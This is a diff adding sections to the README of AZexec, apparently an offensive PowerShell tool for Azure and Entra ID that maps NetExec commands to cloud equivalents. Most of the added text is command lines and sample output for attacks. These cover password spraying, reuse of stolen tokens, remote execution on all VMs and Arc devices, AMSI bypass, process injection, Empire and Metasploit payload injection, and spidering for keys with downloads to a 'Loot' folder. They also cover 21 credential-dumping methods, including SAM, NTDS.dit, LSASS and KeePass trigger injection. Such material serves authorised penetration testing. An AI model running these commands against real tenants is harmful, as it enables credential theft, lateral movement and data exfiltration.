@@ -33,6 +33,44 @@
 
 ---
 
+## 📑 Table of Contents
+
+- [NetExec to AZexec Command Mapping](#-netexec-to-azexec-command-mapping)
+- [Domain User Enumeration](#-domain-user-enumeration---azureentra-id-equivalent)
+- [RID Bruteforcing](#-rid-bruteforcing---azureentra-id-equivalent)
+- [Enumerate Local Groups](#-enumerate-local-groups---azureentra-id-equivalent)
+- [Workstation Service (wkssvc) Equivalent](#-workstation-service-wkssvc-equivalent-vm-loggedon-command)
+- [Azure Resource Manager Enumeration](#️-azure-resource-manager-enumeration-multi-subscription)
+- [File Transfer (get-file/put-file)](#file-transfer-get-file--put-file)
+- [Credential Extraction (creds)](#-credential-extraction---netexec---sam-equivalent)
+- [Remote Command Execution](#-remote-command-execution---azures-netexec--x-x-equivalent)
+- [Getting Shells - Empire and Metasploit](#-getting-shells---empire-and-metasploit-integration)
+- [Features](#-features)
+- [Visual Indicators & High-Risk Highlighting](#-visual-indicators--high-risk-highlighting)
+- [Related Documentation](#-related-documentation)
+- [Prerequisites & Permissions Matrix](#-prerequisites--permissions-matrix)
+- [Quick Start Setup](#-quick-start-setup)
+- [Codebase Architecture & Command Mapping](#️-codebase-architecture--command-mapping)
+- [Automated Test Suite](#-automated-test-suite)
+- [Command Syntax & Attack Workflows](#-command-syntax--attack-workflows)
+- [Command Examples by Feature](#-command-examples-by-feature)
+- [NetExec-Style Output Reference](#-netexec-style-output-reference)
+- [Security Risk Assessment Guide](#-security-risk-assessment-guide)
+- [Guest User Enumeration - The Azure "Null Session"](#-guest-user-enumeration---the-azure-null-session)
+- [Authentication & Scope Requirements](#-authentication--scope-requirements)
+- [Data Export (CSV/JSON/HTML)](#-data-export-csvjsonhtml)
+- [Professional HTML Reports](#-professional-html-reports)
+- [Common Issues & Solutions](#️-common-issues--solutions)
+- [License](#-license)
+- [Contributing](#-contributing)
+- [Disclaimer](#️-disclaimer)
+- [Author](#-author)
+- [Acknowledgments](#-acknowledgments)
+- [Quick Reference - Penetration Testing Cheat Sheet](#-quick-reference---penetration-testing-cheat-sheet)
+- [Checking Credentials (Domain) - Azure's Pwn3d! Equivalent](#-checking-credentials-domain---azures-pwn3d-equivalent)
+
+---
+
 ## 🔄 NetExec to AZexec Command Mapping
 
 For penetration testers familiar with NetExec (formerly CrackMapExec), here's how the commands translate to Azure:
@@ -44,6 +82,12 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> -u <user> -p <pass> --users`<br>`nxc ldap <target> -u <user> -p <pass> --users` | `.\azx.ps1 user-profiles` | ✅ Required | **Enumerate domain users** (authenticated) |
 | `nxc smb --rid-brute` | `.\azx.ps1 rid-brute` | ✅ Required | **Enumerate users by RID bruteforce** (Azure equivalent) |
 | `nxc smb -u 'a' -p ''` | `.\azx.ps1 guest -Domain example.com -Username user -Password ''` | ❌ None | **Test guest/null login** |
+| `nxc smb <target> -u user -p 'pass'` (shows `Pwn3d!`) | `.\azx.ps1 guest -Domain example.com -Username user -Password 'pass'` | ❌ None | **Credential check with admin detection** - shows `(GlobalAdmin!)` etc. |
+| `nxc smb <target> -u user -H 'hash'` (Pass-the-Hash) | `.\azx.ps1 guest -AccessToken "eyJ0eXAi..."` | ❌ None | **Token auth (Pass-the-Hash equivalent)** - test stolen tokens |
+| `nxc smb -u users.txt -p 'Pass'` | `.\azx.ps1 spray -Domain example.com -UserFile users.txt -Password 'Pass'` | ❌ None | **Password spray attack** (NetExec-style) |
+| `nxc smb -u users.txt -p @pass.txt --no-bruteforce` | `.\azx.ps1 spray ... -PasswordFile pass.txt -NoBruteforce` | ❌ None | **Linear pairing** spray (user1:pass1) |
+| `nxc smb -u users.txt -p 'Pass' --continue-on-success` | `.\azx.ps1 spray ... -ContinueOnSuccess` | ❌ None | **Continue after valid creds** found |
+| `nxc smb -u users.txt -p 'Pass' --local-auth` | `.\azx.ps1 spray ... -LocalAuth` | ❌ None | **Cloud-only** spray (skip federated) |
 | `nxc smb --groups` | `.\azx.ps1 groups` | ✅ Required | Enumerate groups |
 | `nxc smb --local-group` | `.\azx.ps1 local-groups` | ✅ Required | **Enumerate local groups** (Administrative Units) |
 | `nxc smb --pass-pol` | `.\azx.ps1 pass-pol` | ✅ Required | Display password policies |
@@ -65,6 +109,49 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb -M bitlocker` | `.\azx.ps1 bitlocker-enum` | ✅ Required | **Enumerate BitLocker encryption status** (Intune devices + Azure VMs) |
 | `nxc smb -M enum_av` | `.\azx.ps1 av-enum` | ✅ Required | **Enumerate Anti-Virus & EDR products** (security posture assessment) |
 | `nxc smb --tasklist` | `.\azx.ps1 process-enum` | ✅ Required | **Enumerate remote processes** (Windows tasklist / Linux ps aux) |
+| `nxc smb -M lockscreendoors` | `.\azx.ps1 lockscreen-enum` | ✅ Required | **Detect lockscreen backdoors** (accessibility executable hijacking) |
+| `nxc smb -M sccm-recon6` | `.\azx.ps1 intune-enum` | ✅ Required | **Enumerate Intune/Endpoint Manager** (Azure equivalent of SCCM reconnaissance) |
+| `nxc smb --delegate` | `.\azx.ps1 delegation-enum` | ✅ Required | **Enumerate OAuth2 delegation** (impersonation paths via consent grants) |
+| `nxc smb <target> -x "command"` | `.\azx.ps1 exec -VMName "vm" -x "command"` | ✅ Required | **Execute remote command** (shell mode) |
+| `nxc smb <target> -X "command"` | `.\azx.ps1 exec -VMName "vm" -x "command" -PowerShell` | ✅ Required | **Execute PowerShell command** |
+| `nxc smb <targets> -x "cmd" --exec-method smbexec` | `.\azx.ps1 exec -x "cmd" -AllVMs -ExecMethod vmrun` | ✅ Required | **Execute on multiple targets with method selection** |
+| *N/A (Arc devices)* | `.\azx.ps1 exec -DeviceName "device" -x "command"` | ✅ Required | **Execute on Arc-enabled device** (immediate execution) |
+| *N/A (All Arc devices)* | `.\azx.ps1 exec -x "command" -AllDevices` | ✅ Required | **Execute on all Arc-enabled devices** |
+| *N/A (MDE Live Response)* | `.\azx.ps1 exec -DeviceName "device" -x "command" -ExecMethod mde` | ✅ Required | **Execute via MDE Live Response** (async with polling) |
+| *N/A (Intune Remediation)* | `.\azx.ps1 exec -DeviceName "device" -x "command" -ExecMethod intune` | ✅ Required | **Execute via Intune Proactive Remediation** (async) |
+| *N/A (Automation Worker)* | `.\azx.ps1 exec -VMName "server" -x "command" -ExecMethod automation` | ✅ Required | **Execute via Azure Automation Hybrid Worker** |
+| `nxc smb <target> -X "cmd" --amsi-bypass /path` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -PowerShell -AmsiBypass bypass.ps1` | ✅ Required | **Execute with AMSI bypass** |
+| `nxc smb <target> -M pi -o PID=1234 EXEC=cmd` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -ExecMethod pi -PID 1234` | ✅ Required | **Process injection by PID** |
+| `nxc smb <target> -M pi -o USER=admin EXEC=cmd` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -ExecMethod pi -TargetUser "admin"` | ✅ Required | **Process injection by user** |
+| `nxc smb <target> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -VMName "vm"` | ✅ Required | **Execute Empire stager** |
+| `nxc smb <target> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -VMName "vm"` | ✅ Required | **Inject Metasploit payload** |
+| `nxc smb <target> --spider` | `.\azx.ps1 spider` | ✅ Required | **Spider Azure Storage** (enumerate blobs/files) |
+| `nxc smb <target> -M spider_plus -o DOWNLOAD_FLAG=True` | `.\azx.ps1 spider -Download -OutputFolder C:\Loot` | ✅ Required | **Spider with downloads** |
+| `nxc smb <target> --spider --pattern txt,doc` | `.\azx.ps1 spider -Pattern "txt,docx,key,pem,pfx,config"` | ✅ Required | **Spider with pattern filter** |
+| `nxc smb <target> --get-file \\C$\file.txt /local/file.txt` | `.\azx.ps1 get-file -VMName "vm" -RemotePath "C:\file.txt" -LocalPath ".\file.txt"` | ✅ Required | **Download file from target** |
+| `nxc smb <target> --put-file /local/file.txt \\C$\file.txt` | `.\azx.ps1 put-file -VMName "vm" -LocalPath ".\file.txt" -RemotePath "C:\file.txt"` | ✅ Required | **Upload file to target** |
+| `nxc smb <target> --sam` | `.\azx.ps1 creds -VMName "vm"` | ✅ Required | **Extract SAM hashes** (registry hive dump) |
+| `nxc smb <target> --sam` (all targets) | `.\azx.ps1 creds -AllVMs -CredMethod sam` | ✅ Required | **Extract SAM from all VMs** |
+| `nxc smb <target> --lsa` | `.\azx.ps1 creds -VMName "vm" -CredMethod lsa` | ✅ Required | **Extract LSA secrets** (service passwords, cached creds) |
+| `nxc smb <target> --ntds` | `.\azx.ps1 creds -VMName "dc" -CredMethod ntds` | ✅ Required | **Dump NTDS.dit** (DC only, VSS/ntdsutil/DCSync) |
+| `nxc smb <target> -M lsassy` | `.\azx.ps1 creds -VMName "vm" -CredMethod lsass` | ✅ Required | **LSASS memory dump** (comsvcs/procdump/nanodump) |
+| `nxc smb <target> -M backup_operator` | `.\azx.ps1 creds -VMName "vm" -CredMethod backup` | ✅ Required | **Backup Operator extraction** (SeBackupPrivilege) |
+| `nxc smb <target> --sccm` | `.\azx.ps1 creds -VMName "vm" -CredMethod sccm` | ✅ Required | **SCCM/GPP/Intune secrets** (GPP cpasswords, IIS configs) |
+| `nxc smb <target> -M wam` | `.\azx.ps1 creds -VMName "vm" -CredMethod wam` | ✅ Required | **WAM Token Broker** (AAD/TokenBroker JWTs) |
+| `nxc smb <target> -M wifi` | `.\azx.ps1 creds -VMName "vm" -CredMethod wifi` | ✅ Required | **WiFi passwords** (netsh wlan key=clear) |
+| `nxc smb <target> -M putty` | `.\azx.ps1 creds -VMName "vm" -CredMethod putty` | ✅ Required | **PuTTY sessions** (registry) |
+| `nxc smb <target> -M winscp` | `.\azx.ps1 creds -VMName "vm" -CredMethod winscp` | ✅ Required | **WinSCP credentials** (XOR decrypt) |
+| `nxc smb <target> -M vnc` | `.\azx.ps1 creds -VMName "vm" -CredMethod vnc` | ✅ Required | **VNC passwords** (DES decrypt) |
+| `nxc smb <target> -M mremoteng` | `.\azx.ps1 creds -VMName "vm" -CredMethod mremoteng` | ✅ Required | **mRemoteNG connections** (AES-GCM decrypt) |
+| `nxc smb <target> -M veeam` | `.\azx.ps1 creds -VMName "vm" -CredMethod veeam` | ✅ Required | **Veeam backup credentials** (SQL+DPAPI) |
+| `nxc smb <target> -M keepass_discover` | `.\azx.ps1 creds -VMName "vm" -CredMethod keepass_discover` | ✅ Required | **KeePass discovery** (find .kdbx, configs) |
+| `nxc smb <target> -M keepass_trigger` | `.\azx.ps1 creds -VMName "vm" -CredMethod keepass_trigger` | ✅ Required | **KeePass trigger exploit** (config injection) |
+| `nxc smb <target> -M rdcman` | `.\azx.ps1 creds -VMName "vm" -CredMethod rdcman` | ✅ Required | **RDCMan connections** (.rdg files, DPAPI blobs) |
+| `nxc smb <target> -M eventlog_creds` | `.\azx.ps1 creds -VMName "vm" -CredMethod eventlog_creds` | ✅ Required | **Event log credentials** (4688/Sysmon regex) |
+| `nxc smb <target> -M notepad` | `.\azx.ps1 creds -VMName "vm" -CredMethod notepad` | ✅ Required | **Notepad tab state** (binary string recovery) |
+| `nxc smb <target> -M notepad++` | `.\azx.ps1 creds -VMName "vm" -CredMethod notepadpp` | ✅ Required | **Notepad++ backups** (backup file content) |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm" -CredMethod tokens` | ✅ Required | **Extract Managed Identity tokens** (IMDS) |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm" -CredMethod dpapi` | ✅ Required | **Extract DPAPI secrets** (WiFi, CredMan, browsers) |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
 
@@ -1270,6 +1357,1106 @@ All ARM commands share a common multi-subscription enumeration pattern:
 - Security risk assessment
 - Detailed security issues list
 
+### Spider: `spider`
+
+The `spider` command is the **Azure equivalent of NetExec's `--spider` and `spider_plus` module**. It supports **three spider modes**:
+
+1. **Azure Storage** (default) - Blob containers & Azure File Shares
+2. **VM Shares** - Spider file systems on Azure VMs via `exec`
+3. **Device Shares** - Spider file systems on Arc/MDE/Intune devices via `exec`
+
+#### Storage Spider (Default)
+
+```powershell
+# Basic enumeration - list all accessible blobs and files
+.\azx.ps1 spider
+
+# Pattern filter - search for sensitive file types
+.\azx.ps1 spider -Pattern "txt,docx,key,pem,pfx,config,xml,json,yml"
+
+# Download matching files
+.\azx.ps1 spider -Pattern "pem,pfx,key" -Download -OutputFolder "C:\Loot"
+
+# Target specific storage account
+.\azx.ps1 spider -StorageAccountTarget "mystorageaccount" -BlobsOnly
+
+# Limit recursion depth and file size
+.\azx.ps1 spider -Download -MaxFileSize 5 -Depth 5
+
+# Export results
+.\azx.ps1 spider -Pattern "config,env" -ExportPath spider-results.json
+```
+
+#### VM Spider (NEW)
+
+Spider file systems on Azure VMs using VM Run Command:
+
+```powershell
+# Spider single VM
+.\azx.ps1 spider -VMName "vm-web-01" -Pattern "key,pem,config"
+
+# Spider all VMs with path filtering
+.\azx.ps1 spider -AllVMs -Pattern "password,credential" -StartPath "C:\Users"
+
+# Spider with exclusions and downloads
+.\azx.ps1 spider -VMName "vm-01" -Download -ExcludePaths "Windows,Program Files"
+
+# Spider all VMs in a resource group
+.\azx.ps1 spider -AllVMs -ResourceGroup "Production-RG" -Pattern "pem,pfx"
+```
+
+#### Device Spider (NEW)
+
+Spider file systems on Arc-enabled devices:
+
+```powershell
+# Spider single Arc device
+.\azx.ps1 spider -DeviceName "arc-server-01" -Pattern "key,pem"
+
+# Spider all Arc devices
+.\azx.ps1 spider -AllDevices -StartPath "/etc" -Pattern "conf,key"
+
+# Spider with downloads
+.\azx.ps1 spider -DeviceName "arc-srv" -Download -MaxFileSize 5
+
+# Combined spidering
+.\azx.ps1 spider -AllVMs -AllDevices -Pattern "pem,pfx"
+```
+
+**Parameters**:
+| Parameter | Default | Description |
+|-----------|---------|-------------|
+| `-Pattern` | (all files) | Comma-separated extensions/keywords to match (e.g., "txt,docx,key,pem") |
+| `-Download` | $false | Enable file downloading |
+| `-MaxFileSize` | 10 | Maximum file size in MB to download |
+| `-OutputFolder` | `.\SpiderLoot` | Download destination folder |
+| `-Depth` | 10 | Maximum recursion depth for directory traversal |
+| `-BlobsOnly` | $false | Only spider blob containers (storage mode) |
+| `-SharesOnly` | $false | Only spider Azure File Shares (storage mode) |
+| `-StorageAccountTarget` | (all) | Target a specific storage account |
+| `-ContainerTarget` | (all) | Target a specific container/share |
+| `-VMName` | - | Target specific VM by name (VM spider) |
+| `-AllVMs` | $false | Spider all VMs in scope (VM spider) |
+| `-DeviceName` | - | Target specific Arc device by name (Device spider) |
+| `-AllDevices` | $false | Spider all Arc devices in scope (Device spider) |
+| `-StartPath` | C:\\ (Win) / / (Linux) | Starting directory for VM/Device spider |
+| `-ExcludePaths` | - | Comma-separated paths to exclude from spider |
+| `-StorageOnly` | $false | Only spider Azure Storage (skip VMs/Devices) |
+| `-VMsOnly` | $false | Only spider VMs |
+| `-DevicesOnly` | $false | Only spider Arc/MDE/Intune devices |
+
+**File Risk Classification**:
+| Risk Level | Color | File Types |
+|------------|-------|------------|
+| **CRITICAL** | Red | `.pem`, `.pfx`, `.p12`, `.key`, `.cer`, `*password*`, `*credential*`, `*secret*`, `.kdbx` |
+| **HIGH** | Yellow | `.config`, `.conf`, `.ini`, `.xml`, `.json`, `.yaml`, `.yml`, `.env`, `*connection*` |
+| **MEDIUM** | Cyan | `.docx`, `.xlsx`, `.pdf`, `.txt`, `.csv`, `.sql`, `.bak`, `.ps1`, `.sh` |
+| **LOW** | Gray | All other files |
+
+**RBAC Requirements**:
+| Spider Mode | Required Permissions |
+|-------------|---------------------|
+| Storage | Reader + Storage Account Key Operator / Storage Blob Data Reader |
+| VM (vmrun) | Reader + Virtual Machine Command Executor OR VM Contributor |
+| Arc | Azure Connected Machine Resource Administrator |
+| MDE | Machine.LiveResponse, Machine.Read.All |
+| Intune | DeviceManagementManagedDevices.PrivilegedOperations.All |
+
+**NetExec Comparison**:
+```
+# NetExec SMB Spider
+nxc smb 192.168.1.0/24 -u user -p pass --spider
+
+# AZexec Azure Storage Spider
+.\azx.ps1 spider
+
+# AZexec VM Spider
+.\azx.ps1 spider -VMName vm-01
+
+# NetExec spider_plus with downloads
+nxc smb IP -M spider_plus -o DOWNLOAD_FLAG=True
+
+# AZexec with downloads (storage)
+.\azx.ps1 spider -Download -OutputFolder C:\Loot
+
+# AZexec with downloads (VM)
+.\azx.ps1 spider -VMName vm-01 -Download -OutputFolder C:\Loot
+```
+
+**Sample Output (Storage Spider)**:
+```
+[*] AZX - Azure Storage Spider
+[*] Pattern Filter: txt,config,pem
+
+[*] STORAGE ACCOUNT: mystorageaccount
+    Resource Group: prod-rg | Public: No
+    [*] Blob Containers: 3
+        Container: config (Public: No)
+        AZR    mystorageaccount     443    /config/app.config              [HIGH] [MATCH] Size: 4.5KB
+        AZR    mystorageaccount     443    /config/creds/service.pem       [CRITICAL] [MATCH] Size: 1.2KB
+    [*] File Shares: 2
+        Share: backups
+        AZR    mystorageaccount     443    /backups/db-backup.sql          [MEDIUM] [MATCH] Size: 45MB
+
+[*] SPIDER SUMMARY
+[*] Storage Accounts: 5 | Containers: 12 | File Shares: 8
+[*] Total Files Scanned: 4,521 | Pattern Matches: 127
+```
+
+**Sample Output (VM Spider)**:
+```
+[*] AZX - VM File System Spider
+[*] Pattern Filter: key,pem,config
+
+[*] VM: vm-web-01
+    Resource Group: prod-rg | OS: Windows
+    [*] Enumerating file system...
+    [+] Found 1,234 files
+    AZR    vm-web-01            VM     C:\Users\admin\.ssh\id_rsa          [CRITICAL] [MATCH] Size: 1.6KB
+    AZR    vm-web-01            VM     C:\inetpub\wwwroot\web.config        [HIGH] [MATCH] Size: 4.2KB
+
+[*] VM SPIDER SUMMARY
+[*] VMs Spidered: 3 | Total Files Scanned: 5,421
+[*] Pattern Matches: 87 | Critical Files: 12
+```
+
+---
+
+### File Transfer: `get-file` / `put-file`
+
+The `get-file` and `put-file` commands are the **Azure equivalent of NetExec's `--get-file` and `--put-file` options**. They support file transfers to/from:
+
+1. **Azure Storage** - Blob containers & Azure File Shares
+2. **Azure VMs** - Via VM Run Command (base64 encoded)
+3. **Arc Devices** - Via Connected Machine Run Command (base64 encoded)
+
+#### Download Files (get-file)
+
+```powershell
+# Download from Azure VM
+.\azx.ps1 get-file -VMName "vm-web-01" -RemotePath "C:\Users\admin\secret.txt" -LocalPath ".\loot\secret.txt"
+
+# Download from Arc device
+.\azx.ps1 get-file -DeviceName "arc-server-01" -RemotePath "/etc/shadow" -LocalPath ".\shadow"
+
+# Download from Blob Storage
+.\azx.ps1 get-file -StorageAccountTarget "mystorageacct" -ContainerTarget "data" -RemotePath "secrets/creds.txt" -LocalPath ".\loot\creds.txt"
+
+# Download from File Share
+.\azx.ps1 get-file -StorageAccountTarget "mystorageacct" -ContainerTarget "fileshare" -RemotePath "configs/app.config" -LocalPath ".\app.config"
+```
+
+#### Upload Files (put-file)
+
+```powershell
+# Upload to Azure VM
+.\azx.ps1 put-file -VMName "vm-web-01" -LocalPath ".\payload.ps1" -RemotePath "C:\Windows\Temp\payload.ps1"
+
+# Upload to Arc device
+.\azx.ps1 put-file -DeviceName "arc-server-01" -LocalPath ".\script.sh" -RemotePath "/tmp/script.sh"
+
+# Upload to Blob Storage
+.\azx.ps1 put-file -StorageAccountTarget "mystorageacct" -ContainerTarget "uploads" -LocalPath ".\data.txt" -RemotePath "folder/data.txt"
+
+# Upload to File Share
+.\azx.ps1 put-file -StorageAccountTarget "mystorageacct" -ContainerTarget "fileshare" -LocalPath ".\config.xml" -RemotePath "configs/config.xml"
+```
+
+**NetExec Comparison**:
+
+```bash
+# NetExec SMB file transfer
+nxc smb 192.168.1.10 -u user -p pass --get-file '\\C$\Users\admin\secret.txt' '/tmp/secret.txt'
+nxc smb 192.168.1.10 -u user -p pass --put-file '/tmp/payload.exe' '\\C$\Windows\Temp\payload.exe'
+
+# AZexec Azure file transfer
+.\azx.ps1 get-file -VMName vm-01 -RemotePath "C:\Users\admin\secret.txt" -LocalPath ".\secret.txt"
+.\azx.ps1 put-file -VMName vm-01 -LocalPath ".\payload.exe" -RemotePath "C:\Windows\Temp\payload.exe"
+```
+
+**Parameters**:
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-LocalPath` | Yes | Local file path (source for put-file, destination for get-file) |
+| `-RemotePath` | Yes | Remote file path on target |
+| `-VMName` | No* | Target Azure VM by name |
+| `-DeviceName` | No* | Target Arc-enabled device by name |
+| `-StorageAccountTarget` | No* | Target storage account name |
+| `-ContainerTarget` | No | Target container/share name (required with StorageAccountTarget) |
+| `-MaxFileSize` | No | Maximum file size in MB for VM/Device downloads (default: 10) |
+
+*One target parameter required: `-VMName`, `-DeviceName`, or `-StorageAccountTarget`
+
+**RBAC Requirements**:
+| Transfer Target | Required Permissions |
+|-----------------|---------------------|
+| Blob Storage (read) | Storage Blob Data Reader |
+| Blob Storage (write) | Storage Blob Data Contributor |
+| File Shares (read) | Storage File Data SMB Share Reader |
+| File Shares (write) | Storage File Data SMB Share Contributor |
+| Azure VMs | Reader + Virtual Machine Command Executor (or VM Contributor) |
+| Arc Devices | Azure Connected Machine Resource Administrator |
+
+**Limitations**:
+- VM/Device transfers use base64 encoding via Run Command, limited to ~500KB files
+- For larger files, use Azure Storage as an intermediary
+- Storage transfers have no practical size limit
+
+**Sample Output**:
+```
+[*] AZX - Azure File Transfer
+[*] Command: put-file (Azure equivalent of nxc smb --put-file)
+
+[*] Uploading: .\payload.ps1 -> C:\Windows\Temp\payload.ps1
+[*] Local file size: 1.2KB
+
+[*] Target: Azure VM (vm-web-01)
+AZR    vm-web-01            VM     PUT    C:\Windows\Temp\payload.ps1    [+] SUCCESS    Size: 1.2KB
+
+[*] TRANSFER SUMMARY
+[*] Files Transferred: 1 | Total Size: 1.2KB | Errors: 0
+```
+
+---
+
+## 🔐 Credential Extraction - NetExec --sam/--lsa/--ntds Equivalent
+
+For penetration testers familiar with NetExec's credential dumping capabilities (`--sam`, `--lsa`, `--ntds`, `-M lsassy`, `-M backup_operator`, `--sccm`, `-M wam`, `-M wifi`, `-M putty`, `-M winscp`, `-M vnc`, `-M mremoteng`, `-M veeam`, `-M keepass_discover`, `-M keepass_trigger`, `-M rdcman`, `-M eventlog_creds`, `-M notepad`, `-M notepad++`), AZexec provides the **Azure cloud equivalent** through the `creds` command. This command extracts credentials from Azure VMs, Arc-enabled devices, MDE-enrolled devices, and Intune-managed devices using 21 extraction techniques.
+
+### Supported Device Types
+
+| Device Type | Execution Method | Sync/Async | Output | Use Case |
+|-------------|------------------|------------|--------|----------|
+| **Azure VMs** | VM Run Command (`vmrun`) | Sync | Direct | Azure native VMs |
+| **Arc Devices** | Arc Run Command (`arc`) | Sync | Direct | On-premises/hybrid servers |
+| **MDE Devices** | Live Response (`mde`) | Async (polling) | Via download link | MDE-enrolled endpoints |
+| **Intune Devices** | Proactive Remediation (`intune`) | Async only | Portal only | Intune-managed devices |
+
+### Extraction Methods
+
+| Method | NetExec Equivalent | Description | Target OS | Risk Level |
+|--------|--------------------|-------------|-----------|------------|
+| **sam** | `nxc smb --sam` | SAM/SYSTEM/SECURITY registry hive extraction | Windows | HIGH - triggers MDE alerts |
+| **tokens** | *Azure-specific* | Managed Identity JWT tokens from IMDS (169.254.169.254) | Windows/Linux | MEDIUM - Azure-specific |
+| **dpapi** | *Azure-specific* | DPAPI secrets (WiFi PSK, Credential Manager, browser paths) | Windows | MEDIUM |
+| **lsa** | `nxc smb --lsa` | LSA secrets (service passwords, cached domain creds, machine account hash, DPAPI backup key) | Windows | HIGH |
+| **ntds** | `nxc smb --ntds [vss]` | NTDS.dit Active Directory database dump (VSS/ntdsutil/DCSync) | Windows (DC only) | CRITICAL |
+| **lsass** | `nxc smb -M lsassy` | LSASS process memory dump (comsvcs/procdump/nanodump/direct) | Windows | CRITICAL - highest detection risk |
+| **backup** | `nxc smb -M backup_operator` | SeBackupPrivilege extraction (robocopy /B for hives + optional NTDS) | Windows | HIGH |
+| **sccm** | `nxc smb --sccm` | SCCM cache, GPP cpasswords, Intune scripts, IIS configs | Windows | MEDIUM |
+| **wam** | `nxc smb -M wam` | Windows Account Manager tokens (TokenBroker, AAD Broker Plugin JWTs) | Windows | MEDIUM |
+| **wifi** | `nxc smb -M wifi` | WiFi saved passwords via `netsh wlan show profile key=clear` | Windows | LOW |
+| **putty** | `nxc smb -M putty` | PuTTY saved sessions from registry (host, user, proxy creds) | Windows | LOW |
+| **winscp** | `nxc smb -M winscp` | WinSCP stored credentials with XOR decryption (magic 0xA3) | Windows | LOW |
+| **vnc** | `nxc smb -M vnc` | VNC passwords from registry/INI with DES ECB decryption (fixed key) | Windows | LOW |
+| **mremoteng** | `nxc smb -M mremoteng` | mRemoteNG connections from confCons.xml with AES-GCM decryption | Windows | LOW |
+| **veeam** | `nxc smb -M veeam` | Veeam Backup credentials from SQL database with DPAPI decryption | Windows | MEDIUM |
+| **keepass_discover** | `nxc smb -M keepass_discover` | KeePass installation discovery (.kdbx, config, running processes) | Windows | LOW |
+| **keepass_trigger** | `nxc smb -M keepass_trigger` | KeePass trigger injection to export database on next open | Windows | HIGH |
+| **rdcman** | `nxc smb -M rdcman` | RDCMan connections from .rdg files (reports DPAPI-encrypted blobs) | Windows | LOW |
+| **eventlog_creds** | `nxc smb -M eventlog_creds` | Credentials from event logs (Security 4688, Sysmon 1) via regex | Windows | MEDIUM |
+| **notepad** | `nxc smb -M notepad` | Notepad tab state binary files (string recovery from .bin) | Windows | LOW |
+| **notepadpp** | `nxc smb -M notepad++` | Notepad++ backup files and recent session files | Windows | LOW |
+| **all** | All of the above | All extraction methods (21 total) | Windows/Linux | CRITICAL |
+| **auto** | *Conservative* | Only sam + tokens + dpapi (original behavior) | Windows/Linux | HIGH |
+
+### NetExec to AZexec Comparison
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb <target> --sam` | `.\azx.ps1 creds -VMName "vm-01"` | Extract SAM hashes from single target |
+| `nxc smb <targets> --sam` | `.\azx.ps1 creds -AllVMs -CredMethod sam` | Extract SAM from all VMs |
+| `nxc smb <target> --lsa` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod lsa` | Extract LSA secrets |
+| `nxc smb <target> --ntds` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds` | Dump NTDS.dit via VSS |
+| `nxc smb <target> --ntds vss` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -NTDSMethod vss` | NTDS via VSS shadow copy |
+| `nxc smb <target> --ntds --enabled` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -EnabledOnly` | NTDS enabled accounts only |
+| `nxc smb <target> --ntds --user X` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -TargetDomainUser X` | NTDS specific user |
+| `nxc smb <target> -M lsassy` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass` | LSASS memory dump |
+| `nxc smb <target> -M nanodump` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod nanodump` | LSASS via nanodump |
+| `nxc smb <target> -M backup_operator` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod backup` | Backup Operator extraction |
+| `nxc smb <target> --sccm` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm` | SCCM/GPP/Intune secrets |
+| `nxc smb <target> --sccm disk` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm -SCCMMethod disk` | SCCM disk search |
+| `nxc smb <target> -M wam` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod wam` | WAM Token Broker extraction |
+| `nxc smb <target> -M wifi` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod wifi` | WiFi password extraction |
+| `nxc smb <target> -M putty` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod putty` | PuTTY session extraction |
+| `nxc smb <target> -M winscp` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod winscp` | WinSCP credential extraction |
+| `nxc smb <target> -M vnc` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod vnc` | VNC password decryption |
+| `nxc smb <target> -M mremoteng` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod mremoteng` | mRemoteNG connection extraction |
+| `nxc smb <target> -M veeam` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod veeam` | Veeam credential extraction |
+| `nxc smb <target> -M keepass_discover` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_discover` | KeePass discovery |
+| `nxc smb <target> -M keepass_trigger` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod keepass_trigger` | KeePass trigger exploit |
+| `nxc smb <target> -M rdcman` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod rdcman` | RDCMan connection extraction |
+| `nxc smb <target> -M eventlog_creds` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod eventlog_creds` | Event log credential extraction |
+| `nxc smb <target> -M notepad` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod notepad` | Notepad tab state recovery |
+| `nxc smb <target> -M notepad++` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod notepadpp` | Notepad++ backup extraction |
